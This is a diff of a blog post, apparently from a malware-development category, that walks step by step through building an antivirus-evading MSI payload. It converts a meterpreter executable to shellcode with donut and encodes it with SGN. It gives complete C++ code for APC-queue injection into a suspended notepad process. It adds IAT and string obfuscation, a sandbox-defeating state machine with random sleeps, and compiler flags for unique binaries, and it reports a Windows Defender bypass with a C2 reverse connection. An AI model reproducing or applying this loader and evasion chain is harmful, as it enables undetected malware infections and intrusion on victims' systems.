@@ -1,245 +1,222 @@
-## Table of Contents
+---
+title: "APC Queue Injection MSI Payload — Full AV Evasion Chain"
+excerpt: "Build a fully obfuscated MSI payload using APC Queue shellcode injection, bypassing Windows Defender with SGN encoding, IAT obfuscation, string encryption, and control flow obfuscation."
+categories:
+  - malware-development
+tags:
+  - APC Queue
+  - shellcode
+  - MSI
+  - Windows Defender bypass
+  - C++
+  - IAT obfuscation
+  - SGN encoding
+  - donut
+toc: true
+toc_sticky: true
+toc_label: "Contents"
+toc_icon: "terminal"
+header:
+  overlay_color: "#06060f"
+  overlay_filter: 0.85
+date: 2024-09-05
+---
 
-- [**Outline**](#section-0)
-- [**EXEtoShellCode**](#section-1)
-- [**Shellcode Encoding**](#section-2)
-- [**ShellCode Loader**](#section-3)
-- [**Payload Obfuscation**](#section-4)
-- [**IAT Obfuscation**](#section-5)
-- [**String Obfuscation**](#section-6)
-- [**Control Flow Obfuscation**](#section-7)
-- [**Compiling Obfuscation**](#section-8)
-- [**Conclusion**](#section-6)
+## Outline
 
-
-
-
-## Outline  {#section-0}
 ![](/assets/AV/APC.png)
 
+We will create a malicious MSI payload containing an obfuscated executable using the APC Queue shellcode injection technique. During this process, we apply multiple obfuscation layers to bypass both signature and behavioral detection: shellcode encoding, IAT obfuscation, string encryption, control flow obfuscation, payload signing, and file bloating.
 
-We will create a malicious MSI payload containing an obfuscated executable using the APC Queue shellcode injection technique. During this process, we will apply multiple obfuscation methods to bypass both signature and behavioral detection, including shellcode obfuscation, IAT obfuscation, control flow obfuscation, payload signing, and file bloating.
+**APC Queue shellcode injection** abuses Windows' Asynchronous Procedure Call mechanism to inject malicious code into a running process. The attacker writes shellcode into a thread's APC queue; when the target thread next enters an alertable wait state, it executes the injected payload instead of its normal routine — a far less monitored execution vector than `CreateThread`.
 
-
-APC Queue shellcode injection is a method where attackers inject malicious code into a running process by taking advantage of a system feature called Asynchronous Procedure Call (APC). APC is used by Windows to run certain tasks in a thread. In this technique, the attacker places their malicious code (shellcode) into a queue, and when the process runs its next task, it unknowingly executes the injected code instead of the original one.
-
-
-The Proof of Concept video below shows the payload successfully bypassing the latest Windows Defender, establishing a reverse connection to the C2 server.
+The PoC below shows the payload successfully bypassing the latest Windows Defender and establishing a reverse connection to the C2 server.
 
 <video style="max-width: 100%; height: auto;" controls>
   <source src="/assets/AV/MSI.mp4" type="video/mp4">
 </video>
 
-## Creating MSI Malware {#section-0}
+---
 
+## EXE to Shellcode
 
-## Executable to Shell Code
-We will convert meterpreter EXE to shellcode using donut.
+We convert a meterpreter EXE to shellcode using [Donut](https://github.com/TheWover/donut).
 
+The command below loads `piggy.exe` into memory with:
 
-https://github.com/TheWover/donut
-
-This Donut command loads piggy.exe into memory with:
-1) no entropy obfuscation (-e)
-
-2) uses AMSI/WLDP/ETW bypass with a fail-safe option to continue if bypass fails (-b)
-
-3) compresses the file using the aPLib engine (-z 2), and employs a decoy module at level 5 (-j 5) for added obfuscation and evasion.
+1. No entropy obfuscation (`-e 1`)
+2. AMSI/WLDP/ETW bypass with fail-safe continue (`-b 3`)
+3. aPLib compression (`-z 2`)
+4. Decoy module at level 5 (`-j 5`) for additional evasion
 
 ```bash
 ./donut -i /home/kali/donut/piggy.exe -e 1 -b 3 -z -j 5
 ```
 
-![](/assets/AV/donutImage.png)  
+![](/assets/AV/donutImage.png)
 
-However, as expected the shellcode.bin when uploaded to virus total  has a large detection rate
+As expected, uploading the raw `shellcode.bin` to VirusTotal yields a high detection rate — we need to encode it.
 
-![](/assets/AV/loaderVirus.png)  
+![](/assets/AV/loaderVirus.png)
 
-## Polymorphic Shellcode Encoding (Shiginakatai)
-While there are many shell code encryption and encoding methods such as XOR, AES, UUID, IPV4 obfuscation, some libraries and decryption functions are flagged by antivirus solutions such as AES decryption routine.
-Here we will use a simple yet effective encoding  to obfuscate our payload, SGN encoding. “SGN is a polymorphic binary encoder for offensive security purposes such as generating statically undetectable binary payloads”.  It is the upgraded version of the famous shikata_ga_nai.rb used in metasploit.
+---
 
+## Polymorphic Shellcode Encoding (SGN)
 
-https://github.com/EgeBalci/sgn
-Now we will conduct shellcode obfuscation. -i is used for the input file (the meterpreter rat shellcode) and -o is the output. -a is for the architecture and -c is the number of encoding 
-![](/assets/AV/sgn.png)  
+Many encoding schemes (XOR, AES, UUID, IPv4) get flagged because their decryption stubs are well-known signatures. We use **SGN — Shikata Ga Nai next-generation**, a polymorphic binary encoder that produces statically undetectable payloads. It is the successor to Metasploit's `shikata_ga_nai.rb`.
 
+Tool: [EgeBalci/sgn](https://github.com/EgeBalci/sgn)
 
 ```bash
-sgn -i '/home/kali/donut/loader.bin' -o /home/kali/donut/loaderEncrypted.bin -a 64 -c 8 --verbose
+sgn -i '/home/kali/donut/loader.bin' \
+    -o /home/kali/donut/loaderEncrypted.bin \
+    -a 64 -c 8 --verbose
 ```
 
-The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.
+![](/assets/AV/sgn.png)
 
-Uploading the shellcode we get a 0 detection rate.
-![](/assets/AV/zero.png)  
+The key advantage of SGN is **self-decoding at runtime** — no decryption stub needs to be written into the loader. Simply load and execute the encoded payload bin directly.
 
+Result: **0 detections** after SGN encoding.
 
-The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.
+![](/assets/AV/zero.png)
 
-## Creating APC Shellcode Loader
-Creating a Shellcode Loader
+---
 
-Now that we have our encoded shellcode, we need to create a PE, exe file to launch this shellcode using c++.
+## APC Shellcode Loader
 
-**VirtualAlloc**: Allocates memory for the payload, typically using MEM_COMMIT and PAGE_READWRITE to allow writing to the allocated memory.
+With encoded shellcode in hand, we build a PE (`.exe`) in C++ that injects it via APC Queue.
 
-**RtlMoveMemory**: Copies the payload (malicious code) from the file or buffer into the newly allocated memory region.
-VirtualProtect: Changes the protection of the allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ to allow the payload to execute.
+**Key Win32 API calls:**
 
-**CreateThread**: Starts a new thread, executing the payload in memory. This is the method used to run the injected code.
-WaitForSingleObject: Pauses the current thread until the thread running the payload finishes execution, ensuring the payload completes.
+| API | Role |
+|-----|------|
+| `CreateProcessA` | Spawn target (notepad) in suspended state |
+| `VirtualAllocEx` | Allocate RWX memory in target process |
+| `WriteProcessMemory` | Copy shellcode into remote process memory |
+| `QueueUserAPC` | Queue shellcode as APC on the suspended thread |
+| `ResumeThread` | Resume thread, triggering APC execution |
 
-**QueueUserAPC**: This function queues an Asynchronous Procedure Call (APC) to a specific thread. If used with a thread in an alertable state (such as one created with SleepEx or WaitForSingleObjectEx), the payload will be executed when the thread enters that state. This technique is commonly used to inject code into a thread in a less obvious manner, bypassing some common defenses.
-
-```bash
-#include <windows.h>
+```cpp
 #include <windows.h>
 #include <stdio.h>
 
-// Function to read a binary file
 unsigned char* readBinaryFile(const char* fileName, SIZE_T* size) {
     FILE* file = fopen(fileName, "rb");
     if (!file) {
         printf("Could not open file %s\n", fileName);
         return NULL;
     }
-
     fseek(file, 0, SEEK_END);
     *size = ftell(file);
     fseek(file, 0, SEEK_SET);
 
     unsigned char* buffer = (unsigned char*)malloc(*size);
     if (!buffer) {
-        printf("Memory allocation failed\n");
         fclose(file);
         return NULL;
     }
-
     fread(buffer, 1, *size, file);
     fclose(file);
     return buffer;
 }
 
 int main() {
-    // Read shellcode from the binary file (e.g., loaderEncrypted.bin)
     const char* fileName = "loaderEncrypted.bin";
     SIZE_T shellcodeSize;
     unsigned char* shellcode = readBinaryFile(fileName, &shellcodeSize);
-    
-    if (!shellcode) {
-        printf("Failed to read the binary file.\n");
-        return -1;
-    }
+    if (!shellcode) return -1;
 
-    // Create a suspended Notepad process
+    // Spawn notepad in a suspended state
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
-    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("Failed to create process\n");
+    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe",
+                        NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         free(shellcode);
         return -1;
     }
 
-    // Allocate memory in the target process
-    LPVOID bufferAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (!bufferAddr) {
-        printf("VirtualAllocEx failed\n");
+    // Allocate RWX memory in the remote process
+    LPVOID bufferAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
+                                       MEM_RESERVE | MEM_COMMIT,
+                                       PAGE_EXECUTE_READWRITE);
+    if (!bufferAddr) { free(shellcode); return -1; }
+
+    // Write shellcode into remote memory
+    if (!WriteProcessMemory(pi.hProcess, bufferAddr,
+                            shellcode, shellcodeSize, NULL)) {
         free(shellcode);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
         return -1;
     }
 
-    // Write the shellcode into the allocated memory
-    if (!WriteProcessMemory(pi.hProcess, bufferAddr, shellcode, shellcodeSize, NULL)) {
-        printf("WriteProcessMemory failed\n");
-        free(shellcode);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return -1;
-    }
-
-    // Queue the APC for the shellcode to be executed
+    // Queue APC — shellcode executes when thread enters an alertable wait state
     QueueUserAPC((PAPCFUNC)bufferAddr, pi.hThread, NULL);
-
-    // Resume the suspended thread to execute the shellcode
     ResumeThread(pi.hThread);
 
-    // Cleanup
     free(shellcode);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-
     return 0;
 }
-
-
 ```
+
+---
+
 ## IAT Obfuscation
 
-One thing to note is that using the above WIN32 API directly, such as VirtualAllocEX, QueueUserAPC and etc will be likely flagged as suspicious. We can verify this by checking the Import Address Table by  utilizing a tool called PE Studio
+Calling `VirtualAllocEx`, `QueueUserAPC`, and `WriteProcessMemory` directly places them in the **Import Address Table (IAT)** — an immediate red flag visible in any PE analysis tool like [PE Studio](https://www.winitor.com/).
 
- ![](/assets/AV/PE.png)  
-Dynamic Function Resolution: GetProcAddress is used to dynamically resolve the addresses of the required functions 
+![](/assets/AV/PE.png)
 
-```bash
+**Dynamic resolution via `GetProcAddress`** removes imports from the IAT:
 
+```cpp
 HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
 
-LPVOID (WINAPI * pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(hKernel32, "VirtualAllocEx");
-
+LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))
+    GetProcAddress(hKernel32, "VirtualAllocEx");
 ```
 
-If we do not want to do this manually, we can use built in importers.
-```bash
-https://github.com/JustasMasiulis/lazy_importer
+For a cleaner implementation, use [lazy_importer](https://github.com/JustasMasiulis/lazy_importer) — drop `lazy_importer.hpp` into your `include/` directory and wrap any call with `LI_FN()`:
+
+```cpp
+LI_FN(VirtualAllocEx)(pi.hProcess, NULL, shellcodeSize,
+                      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
-Download the lazy_importer.hpp and save it in a folder called include. 
-Simply add LI_FN() to the function.
 
-We can further implement a custom GetProcAddress to hide its WINAPI Function call but this time we leave it out. 
-
+---
 
 ## String Obfuscation
-Let's take the following code snippet for example, where we create a notepad process for future shell code injection, 
-the string c:\\windows\\system32\notepad.exe is identified in the executable. We can check this using strings.
+
+Plain string literals survive static analysis. Running `strings.exe` on the implant immediately reveals the notepad path:
+
 ```bash
 strings.exe -n 8 implant.exe | findstr /i "C:\\windows"
 ```
-As seen below, the string is identified. 
 
- ![](/assets/AV/string.png)  
+![](/assets/AV/string.png)
 
-To hide the strings we can Import String Obfuscator skCrypter:
+**Fix:** use [skCrypter](https://github.com/skadro-official/skCrypter) to encrypt all string literals at compile time and decrypt at runtime:
 
-https://github.com/skadro-official/skCrypter
+```cpp
+#include "skCrypter.h"
 
-```bash
-#include "skCrypter"
-CreateProcessA(skCrypt(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+CreateProcessA(skCrypt("C:\\Windows\\System32\\notepad.exe"),
+               NULL, NULL, NULL, FALSE,
+               CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 ```
+
+The string is stored encrypted in the binary and only decrypted in-memory at runtime — invisible to static scanners.
+
+---
+
 ## Control Flow Obfuscation
 
-In order to bypass behavior and herustic detection, we implement control flow obfuscation technique.
-Control flow obfuscation  breakes down a standard process of shellcode injection into multiple distinct states, interspersed with benign actions to hinder detection and analysis ,effectively obfuscating the overall execution path and intent
+Behavioral and heuristic engines trace the logical sequence: allocate → write → execute. A state machine with interspersed benign actions breaks that sequence and disrupts automated analysis.
 
-The State enum defines various stages of the process:
-
-**STATE_ALLOCATE**: Allocates memory in the target process using VirtualAllocEx.
-
-**STATE_BENIGN**: Executes benign actions and adds a delay to obscure the intent of the program, making it harder for static analysis tools to detect malicious behavior.
-STATE_WRITE: Writes the shellcode into the allocated memory with WriteProcessMemory.
-
-**STATE_BENIGN_AGAIN**: Executes additional benign actions, further confusing analysis tools and delaying detection.
-
-S**TATE_EXECUTE**: Executes the shellcode by queuing it with QueueUserAPC.
-
-
-
-```bash
+```cpp
 enum State {
     STATE_ALLOCATE,
     STATE_BENIGN,
@@ -249,93 +226,109 @@ enum State {
     STATE_DONE
 };
 
-void obfuscatedControlFlow(LPVOID shellcode, SIZE_T shellcodeSize, PROCESS_INFORMATION* pi, 
+void obfuscatedControlFlow(
+    LPVOID shellcode, SIZE_T shellcodeSize,
+    PROCESS_INFORMATION* pi,
     LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD),
-    BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*),
-    DWORD (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR)) 
+    BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*),
+    DWORD  (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR))
 {
     State state = STATE_ALLOCATE;
     LPVOID bufferAddr = NULL;
-    
+
     while (state != STATE_DONE) {
         switch (state) {
             case STATE_ALLOCATE:
-                // Allocate memory in the target process
-                bufferAddr = pVirtualAllocEx(pi->hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                if (bufferAddr) {
-                    state = STATE_BENIGN;
-                }
+                bufferAddr = pVirtualAllocEx(pi->hProcess, NULL, shellcodeSize,
+                                             MEM_RESERVE | MEM_COMMIT,
+                                             PAGE_EXECUTE_READWRITE);
+                if (bufferAddr) state = STATE_BENIGN;
                 break;
 
             case STATE_BENIGN:
-                // Perform some benign system activities to confuse analysis
-                performBenignActions();
+                performBenignActions(); // file reads, registry queries, etc.
                 advancedSleep();
-                state = STATE_WRITE;  // Move to the next state
+                state = STATE_WRITE;
                 break;
 
             case STATE_WRITE:
-                // Write the shellcode into the allocated memory
-                if (pWriteProcessMemory(pi->hProcess, bufferAddr, shellcode, shellcodeSize, NULL)) {
+                if (pWriteProcessMemory(pi->hProcess, bufferAddr,
+                                        shellcode, shellcodeSize, NULL))
                     state = STATE_BENIGN_AGAIN;
-                } else {
-                    state = STATE_DONE;  // Error encountered
-                }
+                else
+                    state = STATE_DONE;
                 break;
 
             case STATE_BENIGN_AGAIN:
-                // Perform more benign activities after writing shellcode
                 performBenignActions();
-                state = STATE_EXECUTE;  // Proceed to execution after more obfuscation
+                state = STATE_EXECUTE;
                 break;
 
             case STATE_EXECUTE:
-                // Queue the APC for the shellcode to be executed
                 advancedSleep();
                 randomSleep(10000, 110000);
-                
                 pQueueUserAPC((PAPCFUNC)bufferAddr, pi->hThread, NULL);
                 state = STATE_DONE;
                 break;
 
             default:
                 state = STATE_DONE;
-                break;
         }
     }
 }
 ```
-## Compiling with different Flags to reduce detection
-Optimizing and using different flags can lead to reduced signatures because each time a different PE file is produced.
 
-Using different compilation flags can significantly reduce the detection rate of malware by security tools, as each compilation can result in a unique Portable Executable (PE) file with variations in structure, function ordering, and optimizations, thereby reducing signature-based detection.
+The `performBenignActions()` function executes real but harmless Windows operations to confuse sandbox timelines and heuristic engines. `randomSleep()` adds non-deterministic delays that defeat fixed-timeout sandbox analysis.
 
-Key Flags and Their Impact:
--O2: Optimizes the code for speed, producing efficient binary code.
+---
 
--Ob2: Inlines functions aggressively, making the code harder to analyze by combining multiple functions into one.
+## Compiler Flag Obfuscation
 
--Os: Optimizes for binary size, reducing the file size, which can help evade detection as the smaller footprint might bypass some heuristic checks.
+Different compiler flags produce structurally distinct PE files, breaking signature-based detection that relies on predictable binary layouts. Each rebuild generates a unique file.
 
--fno-stack-protector: Disables stack protection mechanisms, which are security features. While this reduces protection against buffer overflows, it might also reduce the likelihood of triggering security defenses in static analysis.
-
--fno-unroll-loops: Prevents loop unrolling, keeping loops as-is. This reduces the predictability of code patterns that AV engines often flag.
-
--s: Strips debugging information, making the binary smaller and removing unnecessary symbols that might contribute to detection.
-
--Xlinker -pdb:none: Removes the generation of program database files (PDBs), further reducing metadata that can trigger detection.
-
--Xlinker -subsystem:console: Specifies the subsystem for the executable, which can alter how it's handled by the OS and can make it harder for some scanners to detect.
-
-By combining these flags, each compilation creates a binary with different characteristics, thus evading detection mechanisms that rely on static signatures.
+| Flag | Effect |
+|------|--------|
+| `-O2` | Speed-optimize; reorganizes code blocks |
+| `-Ob2` | Aggressive inlining; merges functions |
+| `-Os` | Size-optimize; smaller footprint |
+| `-fno-stack-protector` | Removes stack canary code patterns |
+| `-fno-unroll-loops` | Keeps loops compact; less predictable |
+| `-s` | Strips debug symbols |
+| `-Xlinker -pdb:none` | Removes PDB metadata entirely |
 
 ```bash
-clang++.exe -O2 -Ob2 -Os -fno-stack-protector -o your_malware.exe implant.cpp -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti -s
+# LLVM/Clang — console binary
+clang++ -O2 -Ob2 -Os -fno-stack-protector -fno-unroll-loops \
+        -fno-exceptions -fno-rtti -s \
+        -o implant.exe implant.cpp -luser32 -lkernel32
 
-clang++.exe -O2 -Ob2 -Os -fno-stack-protector -Xlinker -pdb:none -Xlinker -subsystem:console -o malware.exe implant.cpp -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti  GNU
+# With linker flags (GNU toolchain)
+clang++ -O2 -Ob2 -Os -fno-stack-protector -fno-unroll-loops \
+        -fno-exceptions -fno-rtti \
+        -Xlinker -pdb:none -Xlinker -subsystem:console \
+        -o malware.exe implant.cpp -luser32 -lkernel32
 ```
 
-- [**Results**](#section-8)
+---
 
-Uploading the implant.exe, we get a detection rate of 2 out of 39 engines from Kleenscan
-https://kleenscan.com/scan_result/d7abfbf0cddff7295257abcaafde2181b88ce647e18e2bc51c2d5f82425bb120 
+## Results
+
+Uploading the fully obfuscated `implant.exe` achieves **2 / 39 detections** on [Kleenscan](https://kleenscan.com/scan_result/d7abfbf0cddff7295257abcaafde2181b88ce647e18e2bc51c2d5f82425bb120).
+
+The two remaining detections are heuristic-based and are addressable by adding additional benign code sections, file bloating, or payload signing with a valid Authenticode certificate.
+
+---
+
+## Conclusion
+
+This walkthrough demonstrated a complete, layered AV evasion chain:
+
+1. **Donut** — converts a PE to position-independent shellcode
+2. **SGN** — polymorphic encoding produces a unique, statically undetectable payload
+3. **APC Queue injection** — executes shellcode inside a suspended legitimate process
+4. **IAT obfuscation** — hides API imports from static scanners via dynamic resolution
+5. **String obfuscation** — encrypts string literals with skCrypter at compile time
+6. **Control flow obfuscation** — disguises the injection sequence with a state machine and benign noise
+7. **Compiler flags** — generates structurally unique PE files on every rebuild
+
+Each layer independently reduces detection probability — combined, they compound into a highly evasive payload, achieving a 2/39 detection rate with Windows Defender bypassed entirely.
